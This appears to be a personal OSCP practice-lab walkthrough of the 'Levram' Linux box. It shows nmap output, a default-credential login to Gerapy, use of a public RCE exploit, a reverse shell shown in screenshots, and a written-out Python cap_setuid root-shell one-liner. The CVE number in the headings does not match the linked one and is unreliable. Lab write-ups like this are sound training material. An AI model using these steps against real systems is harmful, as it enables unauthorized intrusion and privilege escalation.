---
title: OSCP - Levram - Linux
created: 2026-01-26
updated: 2026-01-22
status: seed
draft: false
tags:
  - cyber-security
Related: "[[Cybersecurity]]"
---
# Levram


# Resolution summary
- Nmap to identify services on port 22 and 8000
- Password guessed admin credentials to Gerapy platform
- Used exploit for CVE-2021-243857 to achieve shell
- Upgraded shell by running bash script on target
- Identified vulnerable python setuid configuration
- Used GTFObins to find python command providing privilege escalation to root
## Improved skills
- Linux Privilege Escalation
- Establishing Full TTYs
## Used tools
- nmap
- python
- linpeas.sh
- gerapy
- GTFObins

---

# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN levram.nmap 192.168.228.24 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBYESg2KmNLhFh1KJaN2UFCVAEv6MWr58pqp2fIpCSBEK2wDJ5ap2XVBVGLk9Po4eKBbqTo96yttfVUvXWXoN3M=
|   256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBdIs4PWZ8yY2OQ6Jlk84Ihd5+15Nb3l0qvpf1ls3wfa
8000/tcp open  http-alt syn-ack ttl 61 WSGIServer/0.2 CPython/3.10.6
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
| http-methods: 
|_  Supported Methods: GET OPTIONS
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sat, 05 Oct 2024 01:35:09 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html
|     Content-Length: 9979
|     Vary: Origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align:top; padding:2px 3px; }
|     width:12em; text-align:right; color:#6
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 05 Oct 2024 01:35:04 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept, Origin
|     Allow: GET, OPTIONS
|     Content-Length: 2530
|_    <!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=/favicon.ico><title>Gerapy</title><link href=/static/css/chunk-10b2edc2.79f68610.css rel=prefetch><link href=/static/css/chunk-12e7e66d.8f856d8c.css rel=prefetch><link href=/static/css/chunk-39423506.2eb0fec8.css rel=prefetch><link href=/static/css/chunk-3a6102b3.0fe5e5eb.css rel=prefetch><link href=/static/css/chunk-4a7237a2.19df386b.css rel=prefetch><link href=/static/css/chunk-531d1845.b0b0d9e4.css rel=prefetch><link href=/static/css/chunk-582dc9b0.d60b5161.css rel=prefetch><link href=/static/css/chun
|_http-title: Gerapy
1 service unrecognized despite returning data.
```

---
# Enumeration
## Port 22 - SSH 
No enumeration conducted
## Port 8000 - HTTP (Apache)
- Navigated to `192.168.228.24:8000` with Firefox
- Found login page, password guessed credentials `admin:admin`
![OSCP - Levram - Linux - image1](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image1.png)
- Successfully logged in with `admin:admin` and identified Gerapy is version 0.9.7
![OSCP - Levram - Linux - image2](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image2.png)
---
# Exploitation
## # CVE-2021-243857 (Authenticated RCE)
- Attempted to run exploit `50640.py` against taregt with `admin:admin` credentials - exploit unsuccessful.
![OSCP - Levram - Linux - image3](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image3.png)
- Identified [exploit requires atleast one "project" on platform](https://github.com/LongWayHomie/CVE-2021-43857) to work, so created & deployed `test project`;
![OSCP - Levram - Linux - image4](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image4.png)
- Re-ran exploit `50640.py` successfully
![OSCP - Levram - Linux - image5](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image5.png)
- Created bash reverse shell script on target to establish Full TTY
![OSCP - Levram - Linux - image6](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image6.png)
- Caught shell with netcat listener of port `4545`
![OSCP - Levram - Linux - image7](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image7.png)
---
# Lateral Movement to user
## Local Enumeration
- Searched for users, sudo privileges & cronjobs
![OSCP - Levram - Linux - image8](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image8.png)
- Checked `app` user's home directory, found `local.txt` flag
![OSCP - Levram - Linux - image9](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image9.png)
- Downloaded `linpeas.sh` to target and executed
![OSCP - Levram - Linux - image10](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image10.png)
- Identified Sudo version 1.9.9
- Identified potentially vulnerable:
	- CVE-2022-0847 (DirtyPipe)
	- CVE-2017-5618 (Setuid screen)
	- Python3.10 cap_setuid=ep
	  ![OSCP - Levram - Linux - image11](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image11.png)
---
# Privilege Escalation
## Privilege Escalation vector
- Searched for file capabilities: `getcap -r / 2>/dev/null` & found `python3.10`
![OSCP - Levram - Linux - image12](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image12.png)
- Searched [GTFObins for python capabilities](https://gtfobins.github.io/gtfobins/python/) & found privesc through cap_setuid
- Ran python command; `/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'` for root access
![OSCP - Levram - Linux - image13](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image13.png)
- Navigated to `/root` directory, found and printed `proof.txt`
![OSCP - Levram - Linux - image14](/files/OSCP%20-%20Levram%20-%20Linux%20-%20image14.png)
---
# Trophy & Loot
`local.txt` = `7359701ae43bc362a09bcf9b8c14e17e`
`proof.txt` = `86b558836159caffebe9679b4d429194`

